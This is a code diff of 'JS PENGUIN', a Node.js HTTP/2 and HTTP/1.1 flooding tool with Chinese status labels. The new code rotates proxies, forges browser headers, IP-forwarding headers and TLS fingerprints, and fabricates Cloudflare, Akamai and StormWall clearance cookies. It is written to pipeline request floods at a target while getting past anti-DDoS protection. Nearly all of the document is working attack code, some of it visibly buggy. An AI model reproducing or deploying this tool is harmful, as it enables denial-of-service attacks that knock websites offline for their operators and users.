+                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
+                break;
+            case 130:
+                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 131:
+                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
+            default:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
         }
 
-        // Memory monitor
-        setInterval(() => {
-            const mem = process.memoryUsage();
-            const pct = (mem.rss / os.totalmem()) * 100;
-            if (pct > MAX_RAM_PCT) {
-                console.log('[RAM] Critical (' + pct.toFixed(1) + '%) -> restarting workers');
-                for (const id in cluster.workers) cluster.workers[id].kill();
-                setTimeout(() => {
-                    for (let i=0; i<config.threads; i++) cluster.fork({ config: JSON.stringify(config) });
-                }, 1000);
-            }
-        }, 5000);
+        const platforms = [
+            "Windows NT 10.0; Win64; x64",
+            // "Macintosh; Intel Mac OS X 10_15_7",
+            // "X11; Linux x86_64",
+        ];
 
-        cluster.on('exit', (worker) => {
-            console.log('[Worker ' + worker.id + '] restarting');
-            cluster.fork({ config: JSON.stringify(config) });
-        });
+        const platform = platforms[Math.floor(Math.random() * platforms.length)];
 
-        // Exit timer
-        setTimeout(() => {
-            console.log('[Time expired] Shutting down...');
-            for (const id in cluster.workers) cluster.workers[id].kill();
-            process.exit(0);
-        }, config.time * 1000);
+        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
+        switch (platform) {
+            case "Windows NT 10.0; Win64; x64":
+                secChUaPlatform = "\"Windows\"";
+                sec_ch_ua_arch = "x86";
+                platformVersion = "\"10.0.0\"";
+                break;
+            case "Macintosh; Intel Mac OS X 10_15_7":
+                secChUaPlatform = "\"macOS\"";
+                sec_ch_ua_arch = "arm"
+                platformVersion = "\"14.5.0\"";
+                break;
+            case "X11; Linux x86_64":
+                secChUaPlatform = "\"Linux\"";
+                sec_ch_ua_arch = "x86"
+                platformVersion = "\"5.15.0\"";
+                break;
+            default:
+                secChUaPlatform = "\"Windows\"";
+                sec_ch_ua_arch = "x86";
+                platformVersion = "\"10.0.0\"";
+                break;
+        }
 
-        // Status output
-        let statusCodes = {};
-        setInterval(() => {
-            let total = 0;
-            for (const k in statusCodes) total += statusCodes[k];
-            console.log('[Stats] Requests: ' + total + ', codes: ' + JSON.stringify(statusCodes));
-            statusCodes = {};
-        }, 1000);
+        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
 
-        cluster.on('message', (worker, msg) => {
-            if (msg.type === 'status') {
-                for (const [code, count] of Object.entries(msg.data)) {
-                    statusCodes[code] = (statusCodes[code] || 0) + count;
-                }
-            }
-        });
-    })();
+        if (ua_opt) {
+            user_agent = ua_opt;
+        }
 
-} else {
-    // ----------------------------------------------
-    //  CLUSTER WORKER - FIXED
-    // ----------------------------------------------
-    CONFIG = JSON.parse(process.env.config);
-    loadProxies();  // THIS IS THE FIX
-    console.log('[Worker] Started with', proxyPool.length, 'proxies');
-
-    (async function worker() {
-        const maxConns = 20;
-        const sessions = [];
-
-        for (let i=0; i<maxConns; i++) {
-            const proxyStr = getLiveProxy();
-            if (!proxyStr) { await sleep(100); continue; }
-            const parts = proxyStr.split(':');
-            const host = parts[0];
-            const port = parseInt(parts[1]);
-            const user = parts[2] || '';
-            const pass = parts[3] || '';
-            const type = CONFIG.proxyType;
-
-            const connector = new ProxyConnector(host, port, type, user, pass);
-            let cookie = '';
-            if (CONFIG.cookieMode === 'CLOUDFLARE') {
-                cookie = await solveCF(proxyStr);
-            } else {
-                cookie = generateCookie(CONFIG.cookieMode);
-            }
-
+        var referer;
+        if (referer_opt) {
+            const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
+            const extension = extensions[Math.random(Math.floor() * extensions.length)];
             try {
-                const session = new H2Session(connector, cookie);
-                await session.start();
-                sessions.push(session);
-                if (CONFIG.debug) console.log('[Worker] Session started on', host);
-            } catch(e) {
-                if (CONFIG.debug) console.log('[Worker] Failed on', host, ':', e.message);
-                if (CONFIG.ratelimit) proxyBlacklist.add(proxyStr);
-                connector.close();
+                if (referer_opt === "RAND") {
+                    referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
+                } else {
+                    const referer_url = new URL(referer_opt);
+                    referer = referer_url.href;
+                }
+            } catch (err) {
+                referer = url.href;
             }
-            await sleep(CONFIG.delay || 5);
         }
 
-        setInterval(async () => {
-            for (let i=sessions.length-1; i>=0; i--) {
-                if (!sessions[i].active) {
-                    sessions[i].proxy.close();
-                    sessions.splice(i,1);
-                }
+        var pathname = this.path;
+        if (pathname === "") {
+            pathname = "/"
+        }
+
+        if (pathname.includes('%RAND%')) {
+            // pathname = '/' + random_string(6);
+            pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));
+        }
+
+        // console.log(`pathname: ${pathname}`);
+
+        if (randpath) {
+            const pathname_length = pathname.length;
+            // console.log(`pathname[pathname_length]: ${pathname[pathname_length-1]}, length: ${pathname_length}`);
+            if (pathname[pathname_length-1] !== "/") {
+                pathname = `${pathname}/${random_string(random_int(6, 9))}`;
+            } else {
+                pathname = `${pathname}${random_string(random_int(6, 9))}`;
             }
-            while (sessions.length < maxConns) {
-                const proxyStr = getLiveProxy();
-                if (!proxyStr) break;
-                const parts = proxyStr.split(':');
-                const connector = new ProxyConnector(parts[0], parseInt(parts[1]), CONFIG.proxyType, parts[2]||'', parts[3]||'');
-                let cookie = '';
-                if (CONFIG.cookieMode === 'CLOUDFLARE') {
-                    cookie = await solveCF(proxyStr);
-                } else {
-                    cookie = generateCookie(CONFIG.cookieMode);
-                }
-                try {
-                    const session = new H2Session(connector, cookie);
-                    await session.start();
-                    sessions.push(session);
-                } catch(e) {
-                    if (CONFIG.ratelimit) proxyBlacklist.add(proxyStr);
-                    connector.close();
-                }
-                await sleep(5);
+        }
+
+        if (query_opt) {
+            pathname = pathname + '?' + random_string(random_int(6, 9))
+        }
+
+        // console.log(`final_pathname: ${pathname}`);
+        let request_method = reqmethod;
+        if (reqmethod === "RAND") {
+            request_method = request_methods[Math.floor(Math.random() * request_methods.length)]
+        }
+
+        let content_length = 0;
+        if (data_opt !== undefined) {
+            content_length = Buffer.from(data_opt, 'utf-8').length;
+        } else if (data_opt === "RAND") {
+            content_length = Buffer.from(random_string(random_int(10, 100)), 'utf-8').length;
+        }
+
+        if (cookie_opt === 'RAND') {
+            cookie_opt = random_cookies();
+        }
+
+        const headers = Object.entries({
+            ":method": request_method,
+            ":authority": url.hostname,
+            ":scheme": "https",
+            ":path": pathname
+        }).concat(Object.entries({
+            // ...(this.id > 1 && Math.random() < 0.40 && { "cache-control": Math.random() < 0.36 ? "max-age=0" : "no-cache" }),
+            // ...(Math.random() < 0.50) && { "cache-control": "max-age=0" },
+            ...(cache_opt && { "cache-control": Math.random() < 0.50 ? "max-age=0" : "no-cache" }),
+            ...(request_method === "POST" && { "content-length": content_length }),
+            ...(request_method === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
+            "sec-ch-ua": brandValue,
+            ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
+            ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
+            ...(full_headers && { "sec-ch-ua-full-version": fullVersion }),
+            ...(full_headers && { "sec-ch-ua-full-version-list": versionList }),
+            "sec-ch-ua-mobile": "?0",
+            ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
+            "sec-ch-ua-platform": secChUaPlatform,
+            ...(full_headers && { "sec-ch-ua-platform-version": platformVersion }),
+            "upgrade-insecure-requests": "1",
+            "user-agent": user_agent,
+            // ...(full_headers && Math.random() < 0.36 && { "sec-purpose": "prefetch;prerender" }),
+            // ...(full_headers && Math.random() < 0.36 && { "purpose": "prefetch" }),
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            "sec-fetch-site": "none",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-user": "?1",
+            "sec-fetch-dest": "document",
+            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)], //"gzip, deflate, br, zstd",
+            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
+            // ...(extra_headers && { "dnt": "true" }),
+            // ...(extra_headers && { "x-client-session": "true" }),
+            ...(extra_headers && { "x-forwarded-for": Math.random() < 0.36 ? `${random_ip()}, ${this.proxy}` : this.proxy }),
+            ...(extra_headers && { "x-forwarded-proto": protocol }),
+            ...(extra_headers && { "x-forwarded-scheme": protocol }),
+            ...(extra_headers && { "x-real-ip": this.proxy }),
+            // ...(extra_headers && Math.random() < 0.5 && { [`x-request-source`]: `"mobile"` }),
+            // ...(extra_headers && Math.random() < 0.5 && { [`x-device-id`]: `"device-${Math.floor(Math.random() * 10000)}` }),
+            // ...(extra_headers && Math.random() < 0.5 && { [`x-session-token`]: `"session-token-${Math.random().toString(36).substring(2, 15)}"` }),
+            "priority": 'u=0, i',
+            ...(cookie_opt) && { "cookie": cookie_opt },
+            ...(referer) && { "referer": referer},
+            // ...(uam_opt) && { "x-forwarded-proto": "https"},
+            // ...(uam_opt) && { "x-forwarded-for": `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`}
+        })).filter(a => a[1] != null);
+
+        this.add_headers(Object.fromEntries(headers));
+        this.order_headers()
+        return this;
+    }
+
+    update_headers() {
+        if (this.path !== undefined && this.path !== url.pathname) {
+            this.replace_header(":path", this.path);
+        }
+        this.order_headers();
+        return this;
+    }
+
+    remove_header(header) {
+        const index = this.headers.findIndex(([header_index, _]) => header_index === header);
+        if (index > -1) {
+            this.headers.splice(index, 1);
+        }
+        return this;
+    }
+
+    order_headers() {
+        const order = [
+            ":method",
+            ":authority",
+            ":scheme",
+            ":path",
+            "cache-control",
+            "content-length",
+            "content-type",
+            "sec-ch-ua",
+            "sec-ch-ua-arch",
+            "sec-ch-ua-bitness",
+            "sec-ch-ua-full-version",
+            "sec-ch-ua-full-version-list",
+            "sec-ch-ua-mobile",
+            "sec-ch-ua-model",
+            "sec-ch-ua-platform",
+            "sec-ch-ua-platform-version",
+            "upgrade-insecure-requests",
+            "user-agent",
+            "sec-purpose",
+            "purpose",
+            "accept",
+            "sec-fetch-site",
+            "sec-fetch-mode",
+            "sec-fetch-user",
+            "sec-fetch-dest",
+            "accept-encoding",
+            "accept-language",
+            "priority",
+            "cookie",
+            "referer",
+            "x-forwarded-for",
+            "x-forwarded-proto",
+            "x-forwarded-scheme"
+        ];
+
+        const order_map = new Map(order.map((header, value) => [header, value]));
+
+        this.headers.sort(([header], [index]) => {
+            const index1 = order_map.get(header);
+            const index2 = order_map.get(index);
+            return (index1 !== undefined ? index1 : Infinity) - (index2 !== undefined ? index2 : Infinity);
+        });
+    }
+
+    build_str() {
+        this.remove_header("priority");
+        this.add_header("Host", url.hostname);
+        let requestStr = `GET ${this.path} HTTP/1.1\r\n`;
+
+        for (const [k, v] of this.headers) {
+            if (!k.startsWith(":")) {
+                requestStr += `${k}: ${v}\r\n`;
             }
-        }, 10000);
-    })();
+        }
+
+        requestStr += 'Connection: keep-alive\r\n\r\n';
+        return requestStr;
+    }
 }
 
-console.log('Interactive mode started. Follow the instructions.');
+function rate_range(base) {
+    const rate_eq = (base * 50) / 100;
+    const min_range = base - rate_eq;
+    const max_range = base + rate_eq;
+
+    return {
+        min: Math.max(0, min_range),
+        max_range
+    };
+}
+
+function random_fingerprint() {
+    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
+    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
+    const extension = extensions[random_int(0, extensions.length - 1)];
+    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];
+
+    const ja3 = `${version},${cipher},${extension},${curve}`;
+
+    return crypto.createHash('md5').update(ja3).digest('hex');
+}
+
+const process_rate = () => {
+    // console.log(`randrate: ${randrate}`);
+    if (randrate === "") {
+        rate = ratelimit
+    } else if (randrate.includes('-')) {
+        let rate_parts = randrate.split('-')
+        var minimum, maximum;
+        if (rate_parts.length == 2) {
+            try {
+                minimum = parseInt(rate_parts[0]);
+                maximum = parseInt(rate_parts[1]);
+                if (minimum > maximum) {
+                    rate = random_int(maximum, minimum);
+                } else {
+                    rate = random_int(minimum, maximum)
+                }
+                rate = random_int(parseInt(rate_parts[0]), parseInt(rate_parts[1]))
+            } catch (err) {
+                rate = random_int(1, 90)
+            }
+        }
+    } else if (randrate === "true") {
+        rate = random_int(1, 128)
+    } else if (randrate !== "") {
+        try {
+            const base_rate = parseInt(randrate)
+            // console.log(`base_rate: ${base_rate}`);
+            const range = rate_range(base_rate, 50);
+            // console.log(`min: ${rate_range.min}, max: ${rate_range.max}`);
+            rate = random_int(range.min, range.max);
+        } catch (err) {
+            rate = random_int(1, 90)
+        }
+    }
+
+    return rate
+}
+
+const start = async (host, port, proto, options = {}) => {
+    // console.log(options)
+    const timeout = (duration) => {
+        setTimeout(() => {
+            start(host, port, proto);
+        }, duration);
+    }
+    // const main_interval = setInterval(async () => {
+        // await timeout(Math.random() * 50);
+        const proxy = new Proxy(host, port, proto);
+        // console.log(`host: ${host}, proxy: ${proxy}`);
+        await proxy.connect(options).then(async (socket) => {
+            // console.log(`socket: ${socket}`);
+            const tls_conn = tls.connect({
+                socket: socket,
+                ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
+                servername: url.hostname,
+                ciphers: ciphers,
+                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
+                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
+                minVersion: versions[versions.length - 1],
+                maxVersion: versions[0],
+                requestOCSP: Math.random() < 0.50 ? true : false,
+                rejectUnauthorized: false,
+                ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
+            }, async () => {
+                // console.log(`(${proto}://${host}:${port}) alpn: ${tls_conn.alpnProtocol}`)
+                var request = new Request(url.pathname);
+                request.set_path(url.pathname);
+                tls_conn.addListener("ratelimit", async (duration) => {
+                    // console.log(`${host}:${port} -> ratelimited for ${duration} seconds`);
+                    const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
+                    const index = proxies.indexOf(proxyKey);
+                    if (index > -1) proxies.splice(index, 1);
+                    tls_conn.end(() => tls_conn.destroy());
+                    await timeout(duration * 1000);
+                });
+                if (tls_conn.alpnProtocol != 'h2') {
+                    tls_conn.on('data', (data) => {
+                        const response = data.toString('utf8');
+                        // console.log(response)
+                        const status_regex = response.match(/HTTP\/1\.1 (\d{3})/);
+
+                        if (status_regex) {
+                            const status = parseInt(status_regex[1]);
+                            // console.log(`${host}:${port} # HTTP1 : status: ${status}`)
+                            status_codes[status] = (status_codes[status] || 0) + 1;
+
+                            if (status == 429 && ratelimit_opt) {
+                                tls_conn.emit('ratelimit', 10);
+                            }
+                        }
+                    });
+
+                    const sendHTTP1 = () => {
+                        request.generate_headers();
+                        const headers = request.build_str();
+                        tls_conn.write(headers, (err) => {
+                            // console.log(`${host}:${port} # HTTP1 : request sent`)
+                            if (!err) {
+                                setTimeout(() => {
+                                    sendHTTP1()
+                                }, 1000 / ratelimit)
+                            } else {
+                                // console.log(`${host}:${port} # HTTP1 : closed connection`)
+                                // status_codes["CLOSE"] = (status_codes["CLOSE"] || 0) + 1;
+                                tls_conn.end(() => tls_conn.destroy());
+                            }
+                        })
+                    };
+
+                    sendHTTP1();
+                }
+
+                if (http_opt === 1) tls_conn.end(() => tls_conn.destroy());
+
+                var http2 = new Http2(host);
+                let streamId = http2.id;
+
+                const updateWindow = Buffer.alloc(4);
+                updateWindow.writeUInt32BE(15663105, 0);
+
+                http2.frames.push(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'))
+
+                const settings_frame = http2.encode_frame(0, 0x4, http2.encode_settings([
+                    [SettingHeaderTableSize, 65536],
+                    [SettingEnablePush, 0],
+                    [SettingInitialWindowSize, 6291456],
+                    [SettingMaxHeaderListSize, 262144],
+                ]));
+
+                http2.frames.push(settings_frame);
+                const update_window_frame = http2.encode_frame(0, 0x8, updateWindow);
+                http2.frames.push(update_window_frame);
+
+                tls_conn.on('data', async (response) => {
+                    http2.data = Buffer.concat([http2.data, response]);
+                        while (http2.data.length >= 9) {
+                            const frame = http2.decode_frame(http2.data);
+                            if (frame != null) {
+                                http2.data = http2.data.subarray(frame.length + 9);
+                                // console.log(`[${frame.streamID}], Type: [${frame.type}], Flags: [${frame.flags}]`);
+                                if (frame.type === 1) {
+                                    const headers = http2.hpack.decode(frame.payload);
+                                    const statusHeader = headers.find(header => header[0] === ':status');
+                                    const cookieHeader = headers.find(header => header[0].toLowerCase() === 'set-cookie');
+                                    const redirectHeader = headers.find(header => header[0] === 'location');
+                        
+                                    if (statusHeader) {
+                                        const statusCode = statusHeader[1];
+                                   
+                                        status_codes[statusCode] = (status_codes[statusCode] || 0) + 1;
+                                        if (statusCode === "429" && ratelimit_opt) {
+                                            // console.log('ratelimited');
+                                            const ratelimit_duration = headers.find(header => header[0] === 'retry-after');
+                                            // console.log(`ratelimit duration: ${ratelimit_duration[1]}`);
+                                            tls_conn.emit("ratelimit", (parseInt(ratelimit_duration[1])));
+                                        }
+
+                                        if (['403', '400', '429'].includes(statusCode) && close_opt) {
+                                            tls_conn.end(() => tls_conn.destroy());
+                                        }
+                                    }
+
+                                    if (cookieHeader && cookieHeader[1]) {
+                                        const set_cookie = cookieHeader[1];
+                                        const current_cookies = request.find_header('cookie');
+                                        if (current_cookies) {
+                                            request.replace_header('cookie', `${current_cookies}, ${set_cookie}`)
+                                        } else {
+                                            request.add_header('cookie', set_cookie);
+                                        }
+                                        // const cookie_value = set_cookie.map(cookie => cookie[1].split(';')[0].trim()).join(';');
+                                        // console.log(`cookieheader: ${set_cookie}`);
+                                    }
+
+                                    if (redirectHeader && redirectHeader[1]) {
+                                        const redirect_url = new URL(redirectHeader[1], url.href);
+                                        const redirect = {
+                                            host: redirect_url.host,
+                                            path: redirect_url.pathname,
+                                            href: redirect_url.href,
+                                        }
+
+                                        if (redirect.host && redirect.host !== url.host) request.replace_header(":authority", redirect.host);
+                                        if (redirect.path) {
+                                            request.set_path(redirect.path);
+                                            request.replace_header(":path", redirect.path);
+                                        }
+                                    }
+                                } else if (frame.type == 4 && frame.flags == 0) {
+                                    tls_conn.write(http2.encode_frame(0, 0x4, "", 0x1));
+                                } else if (frame.type === 7) {
+                                    tls_conn.end(() => tls_conn.destroy());
+                                    return
+                                }
+                            } else {
+                                break;
+                            }
+                    }
+                });
+
+                tls_conn.write(Buffer.concat(http2.frames));
+
+                const sendHTTP2 = () => {
+                    var rate = process_rate();
+
+                    if (tls_conn.destroyed || socket.destroyed) return;
+
+                    const queue = [];
+
+                    for (var x = 0; x < ratelimit; x++) {
+                        request.generate_headers()
+
+                        const packed_headers = Buffer.concat([
+                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                            http2.hpack.encode(request.headers)
+                        ]);
+        
+                        queue.push(http2.encode_frame(streamId, 0x1, packed_headers, 0x1 | 0x4 | 0x20));
+
+                        const data_buffer = data_opt !== undefined ? (data_opt === "RAND" ? Buffer.from(random_string(random_int(10, 100)), 'utf-8') : Buffer.from(data_opt, 'utf-8')) : null;
+                        if (data_buffer) queue.push([http2.encode_frame(streamId, 0x0, data_buffer, 0x0)])
+            
+                        streamId += 2;
+                        http2.id += 2;
+                    }
+
+                    tls_conn.write(Buffer.concat(queue), (err) => {
+                        if (!err) {
+                            setTimeout(() => {
+                                sendHTTP2();
+                            }, 1000 / (rate));
+                        }
+                    });      
+                }
+                sendHTTP2();
+            }).once('close', () => {
+                // console.log(`${host}:${port} TLS connection closed`);
+                // clearInterval(main_interval);
+                tls_conn.removeAllListeners();
+                proxy.close();
+                // socket.close(() => socket.destroy());
+                return;
+            }).once('error', (err) => {
+                // console.log(`${host}:${port} TLS error: ${err.message}`);
+            }).once('end', () => {
+                tls_conn.removeAllListeners();
+                proxy.close();
+                // console.log(`${host}:${port} TLS connection end`);
+                // clearInterval(main_interval);
+                // socket.close(() => socket.destroy());
+                return;
+            });
+        }).catch((err) => {
+            if (checker) {
+                const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
+                const index = proxies.indexOf(proxyKey);
+                if (index > -1) proxies.splice(index, 1);
+            }
+            proxy.close();
+            // console.log(`socket error: ${err}`);
+            return;
+        })
+    // }, 1000);
+}
+
+if (cluster.isMaster) {
+    const workers = {};
+
+    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
+    
+    if (ip_opt === undefined) {
+        console.log(`
+            ${'________'.yellow.bold}${'o8A888888o_'.grey.bold}
+           ${'_o8888888888'.yellow}${'88'.grey.bold}${'K_]'.bgBlack.white.bold}${'888888o'.grey.bold}
+                      ${'~~~'.yellow}${'+8888888888o'.grey.bold}
+                          ${'~8888888888'.grey.bold}
+                          ${'o888'}${'88888888'.grey.bold}
+                         ${'o88888'}${'88888888'.grey.bold}
+                       ${'_888888888'}${'8888888'.grey.bold}
+                      ${'o88888888888'}${'8888888_'.grey.bold}
+                     ${'o8888888888888'}${'8888888_'.grey.bold}
+                    ${'_88888888888888'}${'88888888_'.grey.bold}
+                    ${'8888888888888888'}${'88888888_'.grey.bold}
+                    ${'8888888888888888'}${'888888888'.grey.bold}
+                    ${'8888888888888888'}${'8888888888'.grey.bold}
+                    ${'8888888888888888'}${'8888888888'.grey.bold}
+                    ${'888888888888888'}${'8'.white.bold}${'88888888888'.grey.bold}
+                    ${'~88888888888888'}${'88'.white.bold}${'8888888888_'.grey.bold}
+                     ${'(888888888888'}${'8888'.white.bold}${'8888888888'.grey.bold}
+                      ${'888888888888'}${'88888'.white.bold}${'8888888888'.grey.bold}
+                       ${'8888888888'}${'88888888'.white.bold}${'888888888_'.grey.bold}
+                       ${'~88888888'}${'888888888888'.white.bold}${'88888888'.grey.bold}
+                         ${'+888888'}${'8888888888888'.white.bold}${'8~~~~~'.grey.bold}
+                          ${'~=88'}${'8888888888888888o'.white.bold}
+                   ${'_=oooooooo'.yellow.bold}${'8888888888888888'.white.bold}${'88'.white}
+                    ${'_o88=8888='.yellow.bold}=~${'88888888'.yellow.bold}===8${'888_'.white}    ${'@benshii'.cyan.underline} # ${colors.dim.bold(new Date().toLocaleDateString("en"))}
+                    ${'~'.yellow.bold}   ${'=~~'.yellow.bold} ${'_o88888888='.yellow.bold}      ~~~      ${'JS PENGUIN'.bold} [${'v1.6'.underline}]
+                            ${'~ o8=~88=~'.yellow.bold}           
+    
+    
+        ———   ${'方法'.bold}${':'.red.bold}    [${'HTTP'.bold}${reqmethod.bold}]
+        ———   ${'目标'.bold}${':'.red.bold}    [${target.bold.underline}]
+        ———   ${'时间'.bold}${':'.red.bold}      [${`${time}`.bold} ${'秒'.bold}]
+        ———   ${'线程'.bold}${':'.red.bold}   [${`${threads} 核心`.bold}]
+        ———   ${'速率'.bold}${':'.red.bold}      [${`${ratelimit} 请求/秒`.bold}]
+        ———   ${'调试'.bold}${':'.red.bold}     [${debug === "true" ? 'true'.green.bold : debug === "false" ? 'false'.red.bold : Boolean(debug) ? 'true'.green.bold : 'false'.red.bold}]
+    `);
+    }
+
+    cluster.on('exit', (worker, code, signal) => {
+        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
+            cluster.fork({ core: worker.id % os.cpus().length });
+        }
+    });
+
+    cluster.on("message", (worker, message) => {
+        workers[worker.id] = [worker, message];
+    });
+
+    if (Boolean(debug) && debug !== "false") {
+        var count = 1;
+        setInterval(() => {
+            let status_codes = {};
+            let worker_count = 0;
+            for (let w in workers) {
+                if (workers[w][0].state === "online") {
+                    worker_count++;
+                    // console.log(workers[w]);
+                    for (let st of workers[w][1]) {
+                        for (let code in st) {
+                            if (!status_codes[code]) status_codes[code] = 0;
+                            status_codes[code] += st[code];
+                        }
+                    }
+                } else {
+                    // console.log(`worker state: ${workers[w][0].state}`);
+                }
+            }
+            const statusses = Object.entries(status_codes)
+                .map(([key, value]) => `${colors.bold(key)}: ${colors.underline(value)}`)
+                .join(', ');
+
+            console.log(`[${'JS/PENGUIN'.magenta.bold}] | ${colors.bold('时间')}: [${colors.underline(time-count)}], ${colors.bold('状态')}: [${statusses}]`);
+            count++;
+        }, 1000);
+    }
+} else {
+    // console.log(`starting thread: ${random_string(5)}`);
+    let conns = 1;
+    let delay = delay_opt ? delay_opt : 1;
+    let proxy_protocol = proxytype;
+    // console.log(`proxy_protocol: ${proxy_protocol}`);
+    // console.log(`length: ${proxies.length}`);
+    // console.log(`delay: ${delay}`);
+
+    // let max_conns = connections ? undefined : proxies.length / threads;
+    let active_conns = 0;
+
+    for (var x = 0; x < conns; x++) {
+        const flood_interval = setInterval(() => {
+            let proxy_host, proxy_port, proxy_user, proxy_pass;
+            const proxy = proxies[~~(Math.random() * proxies.length)].split(':');
+            if (connections !== undefined && connections <= active_conns) clearInterval(flood_interval);
+            if (proxy && proxy.length >= 2) {
+                // console.log(proxy)
+                proxy_host = proxy[0]
+                proxy_port = parseInt(proxy[1])
+                if (proxy.length == 4) {
+                    proxy_user = proxy[2]
+                    proxy_pass = proxy[3]
+                }
+                // console.log(proxy_host, proxy_port)
+                start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase(), { username: proxy_user, password: proxy_pass })
+                active_conns++
+            }
+        }, delay)
+        // for (const proxy of proxies) {
+        //     if (!proxy) continue;
+        //     if (connections !== undefined && connections <= active_conns) break;
+        //     let proxy_host, proxy_port;
+        //     proxy_host = proxy.split(':')[0]
+        //     proxy_port = parseInt(proxy.split(':')[1])
+        //     // console.log(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
+        //     start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
+        //     active_conns++;
+        // }
+    }
+
+    if (Boolean(debug) && debug !== "false") {
+        setInterval(() => {
+            if (status_queue.length >= 4) status_queue.shift();
+            status_queue.push(status_codes);
+            status_codes = {};
+            try {
+                if (process.connected) {
+                    process.send(status_queue);
+                }
+            } catch (err) {
+                console.log(err);
+            }
+        }, 250);
+    }
+}
+
+const exit = () => process.exit(1);
+setTimeout(exit, time * 1000);
+
+function bypassHTTPDD0S(proxy, target) {
+    console.log("正在绕过HTTPDD0S保护...");
+    setInterval(() => {
+        const headers = {
+            "User-Agent": random_string(15),
+            "X-Forwarded-For": random_ip()
+        };
+        sendRequest(proxy, target, headers);
+    }, 1000);
+}
+
+function spoofAkamaiFingerprint() {
+    return {
+        "X-Akamai-Request": "true",
+        "X-Request-ID": random_string(32),
+        "X-Forwarded-For": random_ip(),
+    };
+}
+
+function fixJA3Fingerprint() {
+    const ja3 = "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0";
+    return crypto.createHash('md5').update(ja3).digest('hex');
+}
+
+function handleRatelimit(statusCode) {
+    if (statusCode === 429) {
+        console.log("触发速率限制，正在重试...");
+        setTimeout(() => {
+            sendRequest();
+        }, 10000);  
+    }
+}
+
+function generateCookie(mode) {
+    let cookie = "";
+    switch (mode) {
+        case "CLOUDFLARE":
+            cookie = "cf_clearance=" + random_string(32);
+            break;
+        case "STORMWALL":
+            cookie = "sw_session=" + random_string(64);
+            break;
+        case "AKAMAI":
+            cookie = "akamai_secure=" + random_string(128);
+            break;
+        case "REACT":
+            cookie = "react_session=" + random_string(64);
+            break;
+        case "XSRF":
+            cookie = "XSRF-TOKEN=" + random_string(16);
+            break;
+        case "DDG":
+            cookie = "ddg_user=" + random_string(32);
+            break;
+        case "RANDOM":
+            cookie = random_string(64);
+            break;
+        case "custom":
+            cookie = "custom=" + random_string(64);
+            break;
+        default:
+            cookie = random_string(64);
+            break;
+    }
+    return cookie;
+}
+
+function cacheBypass() {
+    return { "cache-control": "no-cache, no-store, must-revalidate" };
+}
+
+function updateFingerprint() {
+    return {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+    };
+}
+
+function addUpdatedHeaders() {
+    return {
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json"
+    };
+}
+
+function updateRandPath(path) {
+    if (Math.random() > 0.5) {
+        return path + "/random/" + random_string(10);
+    }
+    return path;
+}
+
